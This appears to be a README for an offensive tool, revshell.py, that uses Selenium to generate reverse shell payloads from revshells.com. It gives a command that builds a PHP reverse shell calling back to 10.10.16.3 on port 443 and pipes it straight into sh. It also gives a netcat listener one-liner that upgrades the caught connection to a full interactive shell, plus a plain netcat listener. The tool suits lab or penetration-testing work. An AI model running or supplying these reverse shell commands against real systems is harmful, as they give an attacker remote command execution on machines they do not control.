# revshell.py
use selenium with python3 on revshells.com (or docker revshells) to generate shells.

![Peek 2021-10-08 19-51](https://user-images.githubusercontent.com/42157994/136601207-85432e27-c933-4d06-831a-77fbf5e3f603.gif)

revshell command:
```bash
rev_shell.py --ip 10.10.16.3 --port 443 -it 'PHP popen' -os linux -st zsh | sh
```


Listener used (optional):
```bash
stty raw -echo; (echo 'script -qc "/bin/bash" /dev/null';echo pty;echo;echo "stty$(stty -a | awk -F ';' '{print $2 $3}' | head -n 1)";echo export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp;echo export PATH=$PATH:/usr/bin:/bin:/usr/pkg/bin:/usr/local/bin;echo export TERM=xterm-256color;echo alias ll='ls -lsaht'; echo clear; echo id;cat) | nc -lvnp 443 && reset
```
Normal listener:
```bash
nc -lvnp 443
```


![image](https://user-images.githubusercontent.com/42157994/136600825-56bb5f2c-a366-450f-bc57-ee3560f49479.png)
